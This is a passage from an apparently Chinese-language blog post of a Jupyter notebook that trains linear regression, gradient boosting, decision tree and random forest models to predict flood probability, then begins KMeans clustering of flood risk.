class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> accuracy_score</span><br><span class=\"line\">model_line=LinearRegression()</span><br><span class=\"line\">model_line.fit(X_train,y_train)</span><br><span class=\"line\">y_pred = model_line.predict(X_test)</span><br><span class=\"line\">mse = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\">score = model_line.score(X_test,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Model score: <span class=\"subst\">&#123;score&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;均方误差为: <span class=\"subst\">&#123;mse&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;模型的系数为: <span class=\"subst\">&#123;model_line.coef_&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;模型的截距为: <span class=\"subst\">&#123;model_line.intercept_&#125;</span>&quot;</span>)</span><br><span class=\"line\">accuracy = cosine(y_test,y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;accuracy&#125;</span>&#x27;</span>)</span><br><span class=\"line\">joblib.dump(model_line,<span class=\"string\">&#x27;../Model/linear.pkl&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<pre><code>Model score: 0.8444528508563269\n均方误差为: 0.0004043169737229802\n模型的系数为: [0.00560656 0.00564613 0.00565985 0.00567684 0.00565284 0.0056578\n 0.00565561 0.00564293 0.0056437  0.0056492  0.00564238 0.0056413\n 0.005674   0.00564575 0.0056467  0.00562068 0.00568107 0.00563092\n 0.00561738 0.00564302]\n模型的截距为: -0.053357024379501294\n余弦相似度为0.9992129608069907\n\n\n\n\n\n['../Model/linear.pkl']\n</code></pre>\n<h3 id=\"模型二-梯度提升树\"><a class=\"anchor\" href=\"#模型二-梯度提升树\">#</a> 模型二 梯度提升树</h3>\n<pre><code>原理：递归的决策树，能发现更深层的变量关系\n</code></pre>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sklearn.ensemble <span class=\"keyword\">import</span> GradientBoostingRegressor</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.tree <span class=\"keyword\">import</span> plot_tree</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> mean_squared_error</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.model_selection <span class=\"keyword\">import</span> cross_val_score</span><br><span class=\"line\">n_estimators = <span class=\"number\">2000</span></span><br><span class=\"line\">gb_model = GradientBoostingRegressor(n_estimators=n_estimators, random_state=<span class=\"number\">42</span>)</span><br><span class=\"line\">cv_scores = cross_val_score(gb_model, X_train, y_train, cv=<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;每折交叉验证的评分:&quot;</span>, cv_scores)</span><br><span class=\"line\">gb_model.fit(X_train, y_train)</span><br><span class=\"line\">gb_score  = gb_model.score(X_test,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Model Score : <span class=\"subst\">&#123;gb_score&#125;</span>&#x27;</span>)</span><br><span class=\"line\">feature_importances = gb_model.feature_importances_</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;特征重要性:&quot;</span>, feature_importances)</span><br><span class=\"line\">train_loss = np.zeros((gb_model.n_estimators,), dtype=np.float64)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, y_pred <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(gb_model.staged_predict(X_train)):</span><br><span class=\"line\">    train_loss[i] = mean_squared_error(y_train, y_pred)</span><br><span class=\"line\"></span><br><span class=\"line\">test_loss = np.zeros((gb_model.n_estimators,), dtype=np.float64)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, y_pred <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(gb_model.staged_predict(X_test)):</span><br><span class=\"line\">    test_loss[i] = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\">y_pred = gb_model.predict(X_test)</span><br><span class=\"line\">theta = cosine(y_pred,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;theta&#125;</span>&#x27;</span>)</span><br><span class=\"line\">mse = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;均方误差为<span class=\"subst\">&#123;mse&#125;</span>&#x27;</span>)</span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">10</span>, <span class=\"number\">6</span>))</span><br><span class=\"line\">plt.plot(np.arange(<span class=\"number\">1</span>, gb_model.n_estimators + <span class=\"number\">1</span>), train_loss, label=<span class=\"string\">&#x27;Training Loss&#x27;</span>)</span><br><span class=\"line\">plt.plot(np.arange(<span class=\"number\">1</span>, gb_model.n_estimators + <span class=\"number\">1</span>), test_loss, label=<span class=\"string\">&#x27;Test Loss&#x27;</span>)</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Number of Iterations&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Mean Squared Error&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Training and Test Loss&#x27;</span>)</span><br><span class=\"line\">plt.legend()</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">30</span>, <span class=\"number\">18</span>))</span><br><span class=\"line\">plt.bar(<span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(feature_importances)), feature_importances, tick_label=[<span class=\"string\">f&#x27;<span class=\"subst\">&#123;X.columns[i]&#125;</span>&#x27;</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(feature_importances))])</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Feature&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Importance&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Feature Importance&#x27;</span>)</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\">joblib.dump(gb_model,<span class=\"string\">&#x27;../Model/gb_tree.pkl&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<pre><code>---------------------------------------------------------------------------\n\nKeyboardInterrupt                         Traceback (most recent call last)\n\nCell In[35], line 9\n      7 n_estimators = 2000\n      8 gb_model = GradientBoostingRegressor(n_estimators=n_estimators, random_state=42)\n----&gt; 9 cv_scores = cross_val_score(gb_model, X_train, y_train, cv=5)\n     10 print(&quot;每折交叉验证的评分:&quot;, cv_scores)\n     11 gb_model.fit(X_train, y_train)\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\sklearn\\model_selection\\_validation.py:515, in cross_val_score(estimator, X, y, groups, scoring, cv, n_jobs, verbose, fit_params, pre_dispatch, error_score)\n    512 # To ensure multimetric format is not supported\n    513 scorer = check_scoring(estimator, scoring=scoring)\n--&gt; 515 cv_results = cross_validate(\n    516     estimator=estimator,\n    517     X=X,\n    518     y=y,\n    519     groups=groups,\n    520     scoring=&#123;&quot;score&quot;: scorer&#125;,\n    521     cv=cv,\n    522     n_jobs=n_jobs,\n    523     verbose=verbose,\n    524     fit_params=fit_params,\n    525     pre_dispatch=pre_dispatch,\n    526     error_score=error_score,\n    527 )\n    528 return cv_results[&quot;test_score&quot;]\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\sklearn\\model_selection\\_validation.py:266, in cross_validate(estimator, X, y, groups, scoring, cv, n_jobs, verbose, fit_params, pre_dispatch, return_train_score, return_estimator, error_score)\n    263 # We clone the estimator to make sure that all the folds are\n    264 # independent, and that it is pickle-able.\n    265 parallel = Parallel(n_jobs=n_jobs, verbose=verbose, pre_dispatch=pre_dispatch)\n--&gt; 266 results = parallel(\n    267     delayed(_fit_and_score)(\n    268         clone(estimator),\n    269         X,\n    270         y,\n    271         scorers,\n    272         train,\n    273         test,\n    274         verbose,\n    275         None,\n    276         fit_params,\n    277         return_train_score=return_train_score,\n    278         return_times=True,\n    279         return_estimator=return_estimator,\n    280         error_score=error_score,\n    281     )\n    282     for train, test in cv.split(X, y, groups)\n    283 )\n    285 _warn_or_raise_about_fit_failures(results, error_score)\n    287 # For callabe scoring, the return type is only know after calling. If the\n    288 # return type is a dictionary, the error scores can now be inserted with\n    289 # the correct key.\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\sklearn\\utils\\parallel.py:63, in Parallel.__call__(self, iterable)\n     58 config = get_config()\n     59 iterable_with_config = (\n     60     (_with_config(delayed_func, config), args, kwargs)\n     61     for delayed_func, args, kwargs in iterable\n     62 )\n---&gt; 63 return super().__call__(iterable_with_config)\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\joblib\\parallel.py:1051, in Parallel.__call__(self, iterable)\n   1048 if self.dispatch_one_batch(iterator):\n   1049     self._iterating = self._original_iterator is not None\n-&gt; 1051 while self.dispatch_one_batch(iterator):\n   1052     pass\n   1054 if pre_dispatch == &quot;all&quot; or n_jobs == 1:\n   1055     # The iterable was consumed all at once by the above for loop.\n   1056     # No need to wait for async callbacks to trigger to\n   1057     # consumption.\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\joblib\\parallel.py:864, in Parallel.dispatch_one_batch(self, iterator)\n    862     return False\n    863 else:\n--&gt; 864     self._dispatch(tasks)\n    865     return True\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\joblib\\parallel.py:782, in Parallel._dispatch(self, batch)\n    780 with self._lock:\n    781     job_idx = len(self._jobs)\n--&gt; 782     job = self._backend.apply_async(batch, callback=cb)\n    783     # A job can complete so quickly than its callback is\n    784     # called before we get here, causing self._jobs to\n    785     # grow. To ensure correct results ordering, .insert is\n    786     # used (rather than .append) in the following line\n    787     self._jobs.insert(job_idx, job)\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\joblib\\_parallel_backends.py:208, in SequentialBackend.apply_async(self, func, callback)\n    206 def apply_async(self, func, callback=None):\n    207     &quot;&quot;&quot;Schedule a func to be run&quot;&quot;&quot;\n--&gt; 208     result = ImmediateResult(func)\n    209     if callback:\n    210         callback(result)\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\joblib\\_parallel_backends.py:572, in ImmediateResult.__init__(self, batch)\n    569 def __init__(self, batch):\n    570     # Don't delay the application, to avoid keeping the input\n    571     # arguments in memory\n--&gt; 572     self.results = batch()\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\joblib\\parallel.py:263, in BatchedCalls.__call__(self)\n    259 def __call__(self):\n    260     # Set the default nested backend to self._backend but do not set the\n    261     # change the default number of processes to -1\n    262     with parallel_backend(self._backend, n_jobs=self._n_jobs):\n--&gt; 263         return [func(*args, **kwargs)\n    264                 for func, args, kwargs in self.items]\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\joblib\\parallel.py:263, in &lt;listcomp&gt;(.0)\n    259 def __call__(self):\n    260     # Set the default nested backend to self._backend but do not set the\n    261     # change the default number of processes to -1\n    262     with parallel_backend(self._backend, n_jobs=self._n_jobs):\n--&gt; 263         return [func(*args, **kwargs)\n    264                 for func, args, kwargs in self.items]\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\sklearn\\utils\\parallel.py:123, in _FuncWrapper.__call__(self, *args, **kwargs)\n    121     config = &#123;&#125;\n    122 with config_context(**config):\n--&gt; 123     return self.function(*args, **kwargs)\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\sklearn\\model_selection\\_validation.py:686, in _fit_and_score(estimator, X, y, scorer, train, test, verbose, parameters, fit_params, return_train_score, return_parameters, return_n_test_samples, return_times, return_estimator, split_progress, candidate_progress, error_score)\n    684         estimator.fit(X_train, **fit_params)\n    685     else:\n--&gt; 686         estimator.fit(X_train, y_train, **fit_params)\n    688 except Exception:\n    689     # Note fit time as time until error\n    690     fit_time = time.time() - start_time\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\sklearn\\ensemble\\_gb.py:538, in BaseGradientBoosting.fit(self, X, y, sample_weight, monitor)\n    535     self._resize_state()\n    537 # fit the boosting stages\n--&gt; 538 n_stages = self._fit_stages(\n    539     X,\n    540     y,\n    541     raw_predictions,\n    542     sample_weight,\n    543     self._rng,\n    544     X_val,\n    545     y_val,\n    546     sample_weight_val,\n    547     begin_at_stage,\n    548     monitor,\n    549 )\n    551 # change shape of arrays after fit (early-stopping or additional ests)\n    552 if n_stages != self.estimators_.shape[0]:\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\sklearn\\ensemble\\_gb.py:615, in BaseGradientBoosting._fit_stages(self, X, y, raw_predictions, sample_weight, random_state, X_val, y_val, sample_weight_val, begin_at_stage, monitor)\n    608     old_oob_score = loss_(\n    609         y[~sample_mask],\n    610         raw_predictions[~sample_mask],\n    611         sample_weight[~sample_mask],\n    612     )\n    614 # fit next stage of trees\n--&gt; 615 raw_predictions = self._fit_stage(\n    616     i,\n    617     X,\n    618     y,\n    619     raw_predictions,\n    620     sample_weight,\n    621     sample_mask,\n    622     random_state,\n    623     X_csc,\n    624     X_csr,\n    625 )\n    627 # track deviance (= loss)\n    628 if do_oob:\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\sklearn\\ensemble\\_gb.py:257, in BaseGradientBoosting._fit_stage(self, i, X, y, raw_predictions, sample_weight, sample_mask, random_state, X_csc, X_csr)\n    254     sample_weight = sample_weight * sample_mask.astype(np.float64)\n    256 X = X_csr if X_csr is not None else X\n--&gt; 257 tree.fit(X, residual, sample_weight=sample_weight, check_input=False)\n    259 # update tree leaves\n    260 loss.update_terminal_regions(\n    261     tree.tree_,\n    262     X,\n   (...)\n    269     k=k,\n    270 )\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\sklearn\\tree\\_classes.py:1247, in DecisionTreeRegressor.fit(self, X, y, sample_weight, check_input)\n   1218 def fit(self, X, y, sample_weight=None, check_input=True):\n   1219     &quot;&quot;&quot;Build a decision tree regressor from the training set (X, y).\n   1220 \n   1221     Parameters\n   (...)\n   1244         Fitted estimator.\n   1245     &quot;&quot;&quot;\n-&gt; 1247     super().fit(\n   1248         X,\n   1249         y,\n   1250         sample_weight=sample_weight,\n   1251         check_input=check_input,\n   1252     )\n   1253     return self\n\n\nFile f:\\a\\envs\\env\\lib\\site-packages\\sklearn\\tree\\_classes.py:379, in BaseDecisionTree.fit(self, X, y, sample_weight, check_input)\n    368 else:\n    369     builder = BestFirstTreeBuilder(\n    370         splitter,\n    371         min_samples_split,\n   (...)\n    376         self.min_impurity_decrease,\n    377     )\n--&gt; 379 builder.build(self.tree_, X, y, sample_weight)\n    381 if self.n_outputs_ == 1 and is_classifier(self):\n    382     self.n_classes_ = self.n_classes_[0]\n\n\nKeyboardInterrupt: \n</code></pre>\n<h3 id=\"模型三-决策树\"><a class=\"anchor\" href=\"#模型三-决策树\">#</a> 模型三 决策树</h3>\n<pre><code>原理：利用信息增益实现节点的划分\n</code></pre>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.model_selection <span class=\"keyword\">import</span> cross_val_score</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.tree <span class=\"keyword\">import</span> plot_tree</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> mean_squared_error</span><br><span class=\"line\">tree_model = DecisionTreeRegressor(random_state=<span class=\"number\">42</span>)</span><br><span class=\"line\">cv_scores = cross_val_score(tree_model, X_train, y_train, cv=<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;每折交叉验证的评分:&quot;</span>, cv_scores)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;交叉验证评分的平均值:&quot;</span>, np.mean(cv_scores))</span><br><span class=\"line\">tree_model.fit(X_train, y_train)</span><br><span class=\"line\">tree_score = tree_model.score(X_test, y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Model Score :&quot;</span>, tree_score)</span><br><span class=\"line\">feature_importances = tree_model.feature_importances_</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;特征重要性:&quot;</span>, feature_importances)</span><br><span class=\"line\">feature_importances_flat = np.ravel(feature_importances)</span><br><span class=\"line\"><span class=\"comment\"># 可视化特征重要性</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">30</span>, <span class=\"number\">18</span>))</span><br><span class=\"line\">plt.bar(<span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(feature_importances_flat)), feature_importances_flat, tick_label=[<span class=\"string\">f&#x27;<span class=\"subst\">&#123;X.columns[i]&#125;</span>&#x27;</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(feature_importances_flat))])</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Feature&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Importance&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Feature Importance&#x27;</span>)</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"><span class=\"comment\"># 在测试集上进行预测</span></span><br><span class=\"line\">y_pred = tree_model.predict(X_test)</span><br><span class=\"line\">theta = cosine(y_pred,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;theta&#125;</span>&#x27;</span>)</span><br><span class=\"line\">mse = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;均方误差为<span class=\"subst\">&#123;mse&#125;</span>&#x27;</span>)</span><br><span class=\"line\">joblib.dump(tree_model,<span class=\"string\">&#x27;../Model/ju_tree.pkl&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<pre><code>每折交叉验证的评分: [0.04694866 0.04297524 0.0450139  0.04790429 0.04502323]\n交叉验证评分的平均值: 0.045573064737767635\nModel Score : 0.05301513744804842\n特征重要性: [0.05072873 0.04679774 0.04822921 0.0498514  0.05054892 0.05003494\n 0.04871661 0.0509244  0.05185402 0.04976417 0.04994974 0.0515037\n 0.05054295 0.05088047 0.04947362 0.04914221 0.04920693 0.0502652\n 0.05116479 0.05042025]\n</code></pre>\n<p><img data-src=\"output_40_1.png\" alt=\"png\" /></p>\n<pre><code>余弦相似度为0.9952026345820846\n均方误差为0.0024615176549126197\n\n\n\n\n\n['../Model/ju_tree.pkl']\n</code></pre>\n<h3 id=\"模型四-随机森林\"><a class=\"anchor\" href=\"#模型四-随机森林\">#</a> 模型四 随机森林</h3>\n<pre><code>原理： 抽样决策树并使用投票策略\n</code></pre>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rf = RandomForestRegressor(n_estimators=<span class=\"number\">4</span>, random_state=<span class=\"number\">42</span>) </span><br><span class=\"line\">rf.fit(X_train, y_train)</span><br><span class=\"line\">y_pred = rf.predict(X_test)</span><br><span class=\"line\">mse = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\">score = rf.score(X_test,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Model score: <span class=\"subst\">&#123;score&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;均方误差为: <span class=\"subst\">&#123;mse&#125;</span>&quot;</span>)</span><br><span class=\"line\">accuracy = cosine(y_test,y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;accuracy&#125;</span>&#x27;</span>)</span><br><span class=\"line\">feature_importances = rf.feature_importances_</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;特征重要性:&quot;</span>, feature_importances)</span><br><span class=\"line\">feature_importances_flat = np.ravel(feature_importances)</span><br><span class=\"line\"><span class=\"comment\"># 可视化特征重要性</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">30</span>, <span class=\"number\">18</span>))</span><br><span class=\"line\">plt.bar(<span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(feature_importances_flat)), feature_importances_flat, tick_label=[<span class=\"string\">f&#x27;<span class=\"subst\">&#123;X_train.columns[i]&#125;</span>&#x27;</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(feature_importances_flat))])</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Feature&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Importance&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Feature Importance&#x27;</span>)</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"><span class=\"keyword\">import</span> joblib</span><br><span class=\"line\">joblib.dump(rf,<span class=\"string\">&#x27;../Model/rf_forest.pkl&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<pre><code>Model score: 0.499235508143682\n均方误差为: 0.0013016476676680254\n余弦相似度为0.9974668593808351\n特征重要性: [0.04968638 0.04813227 0.04933601 0.05021542 0.05116166 0.0494662\n 0.05073097 0.05094782 0.05060163 0.05058865 0.04939483 0.05095208\n 0.05029554 0.05063372 0.04975227 0.04803734 0.04872015 0.05049445\n 0.05024486 0.05060773]\n</code></pre>\n<p><img data-src=\"output_42_1.png\" alt=\"png\" /></p>\n<pre><code>['../Model/rf_forest.pkl']\n</code></pre>\n<h2 id=\"problem-two-风险聚类\"><a class=\"anchor\" href=\"#problem-two-风险聚类\">#</a> Problem TWO 风险聚类</h2>\n<h3 id=\"读入数据\"><a class=\"anchor\" href=\"#读入数据\">#</a> 读入数据</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">train_data_path=<span class=\"string\">&#x27;../Data/train.csv&#x27;</span></span><br><span class=\"line\">train_data = pd.read_csv(train_data_path)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"聚类算法kmeans\"><a class=\"anchor\" href=\"#聚类算法kmeans\">#</a> 聚类算法：Kmeans</h3>\n<pre><code>原理: 利用n维空间距离对初始聚类中心进行学习，得到最终聚类中心\n</code></pre>\n<h4 id=\"聚类预测函数\"><a class=\"anchor\" href=\"#聚类预测函数\">#</a> 聚类预测函数</h4>\n<pre><code>predict_cluster(kmeans,points)\ninput: kmeans模型 points需要预测的点集\noutput: 点集的预测结果\n</code></pre>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">predict_cluster</span>(<span class=\"params\">kmeans, points</span>):</span><br><span class=\"line\">    points = np.array(points)</span><br><span class=\"line\">    points = points.reshape(-<span class=\"number\">1</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">    cluster_label = kmeans.predict(points)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> cluster_label</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"建立kmeans模型\"><a class=\"anchor\" href=\"#建立kmeans模型\">#</a> 建立 Kmeans 模型</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">train_data_path=<span class=\"string\">&#x27;../Data/train.csv&#x27;</span></span><br><span class=\"line\">train_data = pd.read_csv(train_data_path)</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.cluster <span class=\"keyword\">import</span> KMeans</span><br><span class=\"line\">y=train_data[<span class=\"string\">&#x27;洪水概率&#x27;</span>]</span><br><span class=\"line\">y=np.array(y)</span><br><span class=\"line\"><span class=\"comment\">#y=-np.log(1/y-1)</span></span><br><span class=\"line\">data=np.array(y)</span><br><span class=\"line\">data_2d = data.reshape(-<span class=\"number\">1</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">kmeans = KMeans(n_clusters=<span class=\"number\">3</span>)</span><br><span class=\"line\">kmeans.fit(data_2d)</span><br><span class=\"line\">cluster_centers = kmeans.cluster_centers_</span><br><span class=\"line\"><span class=\"built_in\">print</span>(cluster_centers)</span><br></pre></td></tr></table></figure></p>\n<pre><code>f:\\a\\envs\\env\\lib\\site-packages\\sklearn\\cluster\\_kmeans.py:870: FutureWarning: The default value of `n_init` will change from 10 to 'auto' in 1.4. Set the value of `n_init` explicitly to suppress the warning\n  warnings.warn(\n\n\n[[0.56441718]\n [0.44231226]\n [0.50212141]]\n</code></pre>\n<h4 id=\"建立聚类中心到风险的映射字典\"><a class=\"anchor\" href=\"#建立聚类中心到风险的映射字典\">#</a> 建立聚类中心到风险的映射字典</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">temp = np.array(cluster_centers)</span><br><span class=\"line\">indices= np.argsort(temp,axis=<span class=\"number\">0</span>)</span><br><span class=\"line\">dic=&#123;&#125;</span><br><span class=\"line\">dic[<span class=\"string\">f&#x27;<span class=\"subst\">&#123;indices[<span 